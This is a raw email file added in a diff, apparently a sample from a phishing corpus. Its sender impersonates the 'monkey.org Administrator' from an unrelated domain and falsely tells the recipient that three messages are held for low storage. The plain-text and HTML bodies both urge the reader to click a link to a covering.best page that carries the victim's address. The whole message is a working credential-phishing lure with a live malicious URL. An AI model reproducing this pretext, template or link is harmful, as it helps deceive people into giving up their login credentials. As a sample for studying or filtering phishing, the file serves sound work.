@@ -1,0 +1,153 @@
+Return-Path: admin@angsaraya.com
+Delivered-To: jose@monkey.org
+X-FDA: 81672760428.24.65EE544
+Received: from mail.hons.com.np (mail.hons.com.np [182.54.159.240])
+	by imf24.b.hostedemail.com (Postfix) with ESMTP id 9E55A8000B
+	for <jose@monkey.org>; Sat, 13 Jan 2024 02:50:52 +0000 (UTC)
+Authentication-Results: imf24.b.hostedemail.com;	dkim=none;	spf=none
+ (imf24.b.hostedemail.com: domain of admin@angsaraya.com has no SPF policy
+ when checking 182.54.159.240) smtp.mailfrom=admin@angsaraya.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705114253;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=Yu295oHV3LZrEWaJGQpN8FN52eDZ7Jstz0+/ex2J9Xc=;
+	b=QL/qMS+WPj5TiR0IaYC/RnTjQD8c2EJsFayoA2sURtuodOE3XWZlqniR53vuCzlVfCABv0
+	+aVpOufUOjaP2371xbQWiSrhm+1RG/S6gkx2FEFPeBq98y58Q6a7ZtY3UK8EhNfL2pRzCl
+	8NjQPDiIw4MRDBdU0Jitm0IR7US8/T4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705114253; a=rsa-sha256;
+	cv=none;
+	b=g8uL23q1ry3yyIRmg6MLBXOLhSJjHKYosfP/oqBfDOmicuhrhgRaBHXBlYZjTmVvOKYwMB
+	lVSUv7mUj13vcSpC+2TdutZZvw15GdHe/WjbZTVcrJEZQlNb/MldPKm4CvAj4JidzJ0CQA
+	Hq021DBQGovoq3o2SZPf+2L/hxRhF00=
+ARC-Authentication-Results: i=1;	imf24.b.hostedemail.com;	dkim=none;	spf=none
+ (imf24.b.hostedemail.com: domain of admin@angsaraya.com has no SPF policy
+ when checking 182.54.159.240) smtp.mailfrom=admin@angsaraya.com;	dmarc=none
+Received: from mail.hons.com.np (localhost [127.0.0.1])
+	by mail.hons.com.np (Postfix) with ESMTPS id EE06BD29EE4
+	for <jose@monkey.org>; Fri, 12 Jan 2024 18:56:01 +0545 (+0545)
+Received: from mail.hons.com.np (localhost [127.0.0.1])
+	by mail.hons.com.np (Postfix) with ESMTPS id 0F103D2B9CF
+	for <jose@monkey.org>; Fri, 12 Jan 2024 18:55:53 +0545 (+0545)
+Received: from WIN-MNF57978UDK (unknown [185.38.142.168])
+	by mail.hons.com.np (Postfix) with ESMTPSA id 3D93CD29EF9
+	for <jose@monkey.org>; Fri, 12 Jan 2024 18:55:52 +0545 (+0545)
+From: "monkey.org" <admin@angsaraya.com>
+Subject: Three (3) Incoming mails not delivered
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="f1oiYsY6d7X=_I3rIBGNEtG6QGjxb9A4rA"
+MIME-Version: 1.0
+Date: Fri, 12 Jan 2024 05:10:44 -0800
+Message-Id: <20241201051043F4799878C2-6E0AFCCF82@angsaraya.com>
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 9E55A8000B
+X-Stat-Signature: n5idyi3duiunzubmh7wtcpzn1cinyauw
+X-Spam-Status: No, score=6.56
+X-Rspam-User: 
+X-HE-Tag: 1705114252-789920
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18VpcpbX+bmzIQ+LLu417AVKzmeyNBews+tceIsFM3u68Z?=
+ =?utf-8?q?MZonz4/Y+ZoseUnH4g2pjfG0v58N5LKloyAyX9ihZqSbYM6ixhgQ681IzvYZknxHA?=
+ =?utf-8?q?g5jyVp6EvwY4/FxsqwUN4GRHx0XkhbJLnYLi6RG3fFFmhsvVQWp7mUM2B7aSZGPks?=
+ =?utf-8?q?J0jz3uqjKa6WY2n6E6sxJ6y8hxajfgk3HKJrEQS6hH4jPkqLpt1txU0qcs1GrQyOH?=
+ =?utf-8?q?cMfVzVz+V3pdenA4IaxjorJdSgx5ueL0cSZbhFS8NSWjxHVDc7IwmUnUZJXu1fgEu?=
+ =?utf-8?q?yVowAGuPywbQB8t8XMM02WPHbShPM15LPUr++05SDh/pVC9BS7rSu08F7p7bDhIn+?=
+ =?utf-8?q?1vnmstPDmkyVTdTkfNQvWh7pKohqvjDdyJF85RnkNfXErHyugTFIW+9p0cCbNo6of?=
+ =?utf-8?q?SfD+NbO/bmnY4eFYXp2JeWwE60oTcnkr+duNaj42ZTBx19bO7wTH8iKdohN28E2gL?=
+ =?utf-8?q?F4rlg0WuCt+fn3bNYfQI+ul0NAndv2+ldwNPqlroU9Qj99b0mGEuiEbYRoJYFsFwT?=
+ =?utf-8?q?JTjrASZz5uaj/WtcL/1znDQ=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 21
+
+This is a multi-part message in MIME format
+
+--f1oiYsY6d7X=_I3rIBGNEtG6QGjxb9A4rA
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Hello,
+
+We noticed that you have (3) incoming pending messages from monkey.org=
+ Security Admin Server,
+
+messages were held due to low email storage.=20
+
+Please click to retrieve Messages https://connect.covering.best/utilza=
+tion.html?grow=3Djose@monkey.org
+
+Thanks for choosing our domain and for your cooperation,
+
+monkey.org Administrator.
+
+--f1oiYsY6d7X=_I3rIBGNEtG6QGjxb9A4rA
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"> <META na=
+me=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1"> <=
+META name=3D"format-detection" content=3D"telephone=3Dno"> <title>Thre=
+e (3) Incoming mails not delivered</title>
+ </head>
+ <body style=3D"background-color: rgb(255, 255, 255);" bgcolor=3D"#fff=
+fff"> <P style=3D"color: rgb(0, 0, 0); line-height: normal; font-famil=
+y: helvetica, 'microsoft yahei', verdana, serif, EmojiFont; font-size:=
+ 14px; margin-top: 0px; box-sizing: border-box; font-stretch: normal; =
+font-variant-numeric: normal; font-variant-east-asian: normal;">Hello<=
+FONT color=3D"black" size=3D"3" style=3D"box-sizing: border-box;">,</F=
+ONT></p><p style=3D"color: rgb(0, 0, 0); line-height: normal; font-fam=
+ily: helvetica, 'microsoft yahei', verdana, serif, EmojiFont; font-siz=
+e: 14px; margin-top: 0px; box-sizing: border-box; font-stretch: normal=
+; font-variant-numeric: normal; font-variant-east-asian: normal;">We n=
+oticed that you have (3) incoming pending messages from monkey.org Sec=
+urity Admin Server,</p><p style=3D"color: rgb(0, 0, 0); line-height: n=
+ormal; font-family: helvetica, 'microsoft yahei', verdana, serif, Emoj=
+iFont; font-size: 14px; margin-top: 0px; box-sizing: border-box; font-=
+stretch: normal; font-variant-numeric: normal; font-variant-east-asian=
+: normal;">messages were held due to low email storage.&nbsp;</p><p st=
+yle=3D"color: rgb(0, 0, 0); line-height: normal; font-family: helvetic=
+a, 'microsoft yahei', verdana, serif, EmojiFont; font-size: 14px; marg=
+in-top: 0px; box-sizing: border-box; font-stretch: normal; font-varian=
+t-numeric: normal; font-variant-east-asian: normal;">&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;<BR style=3D"box-sizing: border-box;"><A style=3D=
+"color: rgb(29, 108, 163); box-sizing: border-box; background-color: t=
+ransparent; text-decoration-line: none;" href=3D"https://connect.cover=
+ing.best/utilzation.html?grow=3Djose@monkey.org" target=3D"_blank" rel=
+=3D"noreferrer" data-saferedirecturl=3D"https://www.google.com/url?q=3D=
+https://contact.covering.best/utilzation.html?grow%3D%5BEMail%5D&amp;s=
+ource=3Dgmail&amp;ust=3D1705067583760000&amp;usg=3DAOvVaw34tUW9VHjlda1=
+XResEwEfA">Please click to retrieve Messages</A></p><p style=3D"color:=
+ rgb(0, 0, 0); line-height: normal; font-family: helvetica, 'microsoft=
+ yahei', verdana, serif, EmojiFont; font-size: 14px; margin-top: 0px; =
+box-sizing: border-box; font-stretch: normal; font-variant-numeric: no=
+rmal; font-variant-east-asian: normal;"><BR style=3D"box-sizing: borde=
+r-box;">Thanks&nbsp;for choosing our domain and for your cooperation,<=
+/p><p style=3D"color: rgb(0, 0, 0); line-height: normal; font-family: =
+helvetica, 'microsoft yahei', verdana, serif, EmojiFont; font-size: 14=
+px; margin-top: 0px; box-sizing: border-box; font-stretch: normal; fon=
+t-variant-numeric: normal; font-variant-east-asian: normal;">monkey.or=
+g Administrator.<BR><BR></p><p style=3D"color: rgb(0, 0, 0); line-heig=
+ht: normal; font-family: helvetica, 'microsoft yahei', verdana, serif,=
+ EmojiFont; font-size: 14px; margin-top: 0px; box-sizing: border-box; =
+font-stretch: normal; font-variant-numeric: normal; font-variant-east-=
+asian: normal;"><BR style=3D"color: rgb(0, 0, 0); text-transform: none=
+; text-indent: 0px; font-family: helvetica, 'microsoft yahei', verdana=
+, serif, EmojiFont; font-size: 14px; font-style: normal; font-weight: =
+400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; ba=
+ckground-color: rgb(255, 255, 255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial;"></P></body>
+ </html>
+
+--f1oiYsY6d7X=_I3rIBGNEtG6QGjxb9A4rA--
+
+
